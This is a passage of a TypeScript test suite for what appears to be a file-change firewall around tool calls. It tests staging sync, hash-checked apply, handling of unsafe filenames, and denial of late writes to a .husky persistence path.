    expect(stagedOf(result)?.changes).toEqual([
      { path: 'node_modules/big/blob.bin', decision: 'DENY', ruleId: 'WRITE_NOT_ALLOWED' },
    ]);
    expect(await exists(join(stack.area.stagingRoot, 'node_modules'))).toBe(false);
    expect(await exists(join(stack.project, 'node_modules'))).toBe(false);
  });

  it('an apply() from a diff taken before revert() and baselineAfter() fails its hash check and changes nothing', async () => {
    stack = await startStaged();
    const { area } = stack;
    const pre = await area.sync();
    await writeFile(join(area.stagingRoot, 'README.md'), 'server edit\n');
    const changes = await area.diff(pre.staging);
    expect(changes.map((c) => c.path)).toEqual(['README.md']);
    const restored = await area.revert(changes.map((c) => c.path));
    await area.baselineAfter(
      pre,
      changes.map((c) => ({ path: c.path, applied: false, ruleId: 'WRITE_NOT_ALLOWED' })),
      restored,
    );
    const before = await fingerprint(stack.project);
    const stale = changes.map((c): ChangeDecision => ({ path: c.path, decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'stale' }));
    await expect(area.apply(changes, stale, pre.project)).rejects.toThrow(/changed after it was scanned/);
    expect(await fingerprint(stack.project)).toEqual(before);
    expect(await readFile(join(stack.project, 'README.md'), 'utf8')).toBe('# Demo project\n');
  });

  it('sync() warns once about project files with unsafe names and does not mirror them', async () => {
    const dir = await realpath(await mkdtemp(join(tmpdir(), 'mcp-firewall-unsafe-project-')));
    try {
      const project = join(dir, 'project');
      await makeProject(project);
      await writeFile(join(project, 'src', 'we\\ird.ts'), 'export const secret = "not logged";\n');
      await writeFile(join(project, 'tab\tname.md'), 'x');
      const logs: string[] = [];
      const area = await createStagingArea({ projectRoot: project, stagingParent: dir, maxFileBytes: 1024, log: (l) => logs.push(l) });
      const { project: manifest } = await area.sync();
      expect(logs).toEqual([
        '[firewall] staging: 2 project file(s) with unsafe names are not mirrored into staging: src/we%5Cird.ts, tab%09name.md',
      ]);
      expect(logs.join('')).not.toContain('not logged');
      expect([...manifest.keys()].some((k) => k.includes('ird') || k.includes('name.md'))).toBe(false);
      const stagedSrc = (await readdir(join(area.stagingRoot, 'src'), { encoding: 'buffer' })).map((b) => b.toString('latin1'));
      expect(stagedSrc.sort()).toEqual(['app.ts', 'run.sh']);
      expect(await exists(join(area.stagingRoot, 'tab\tname.md'))).toBe(false);

      await area.sync();
      expect(logs).toHaveLength(2);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('emits FileChangeEvents only when there are changes', async () => {
    stack = await startStaged();
    expect(stack.fileEvents).toEqual([]);
    const result = await stack.handler('noop', {});
    expect(stagedOf(result)).toEqual({ applied: 0, rejected: 0, changes: [] });
    expect(stack.fileEvents).toEqual([]);
  });

  it('a write landing after the post-call diff is caught by the next catch-up, not overwritten', async () => {
    let diffs = 0;
    let stagingRoot = '';
    stack = await startStaged({
      wrapArea: (a) =>
        wrapped(a, [], {
          // diff #1 is initStaging, #2 the first call's catch-up, #3 its post-call diff.
          diff: async (before) => {
            const changes = await a.diff(before);
            if (++diffs === 3) {
              const deadline = Date.now() + 5_000;
              while (!(await exists(join(stagingRoot, 'src/late.ts'))) || !(await exists(join(stagingRoot, '.husky/late')))) {
                if (Date.now() > deadline) throw new Error('late write never landed');
                await new Promise((r) => setTimeout(r, 10));
              }
            }
            return changes;
          },
        }),
    });
    stagingRoot = stack.area.stagingRoot;
    const first = await stack.handler('late_write', { delayMs: 50 });
    expect(stagedOf(first)?.changes).toEqual([]);

    const second = await stack.handler('noop', {});
    expect(stagedOf(second)?.changes).toEqual([]);
    expect(stack.fileEvents.map((e) => [e.toolName, e.changes])).toEqual([
      [
        '<late-writes>',
        [
          { path: '.husky/late', decision: 'DENY', ruleId: 'PERSISTENCE_PATH' },
          { path: 'src/late.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' },
        ],
      ],
    ]);
    expect(await exists(join(stack.project, 'src/late.ts'))).toBe(true);
    expect(await exists(join(stack.project, '.husky/late'))).toBe(false);
  });
});
